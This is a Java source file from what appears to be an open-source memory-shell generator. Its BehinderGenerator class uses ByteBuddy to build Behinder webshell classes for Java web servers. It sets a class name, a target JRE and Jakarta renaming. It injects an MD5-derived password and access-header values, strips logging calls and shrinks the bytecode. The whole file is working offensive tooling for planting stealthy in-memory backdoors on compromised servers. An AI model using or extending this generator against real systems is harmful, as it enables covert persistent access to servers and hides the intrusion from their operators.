package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.BehinderConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.StringUtils;

import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderGenerator {
    private final ShellConfig shellConfig;
    private final BehinderConfig behinderConfig;

    public BehinderGenerator(ShellConfig shellConfig, BehinderConfig behinderConfig) {
        this.shellConfig = shellConfig;
        this.behinderConfig = behinderConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (behinderConfig.getShellClass() == null) {
            throw new IllegalArgumentException("behinderConfig.getClazz() == null");
        }
        if (StringUtils.isBlank(behinderConfig.getPass())) {
            throw new IllegalArgumentException("behinderConfig.getPass().isBlank()");
        }
        String md5Key = DigestUtils.md5Hex(behinderConfig.getPass()).substring(0, 16);

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(behinderConfig.getShellClass())
                .name(behinderConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
            builder = builder.visit(
                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
                        put("pass", md5Key);
                        put("headerName", behinderConfig.getHeaderName());
                        put("headerValue", behinderConfig.getHeaderValue());
                    }})
            );
        } else {
            builder = builder.field(named("pass")).value(md5Key)
                    .field(named("headerName")).value(behinderConfig.getHeaderName())
                    .field(named("headerValue")).value(behinderConfig.getHeaderValue());
        }
        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}
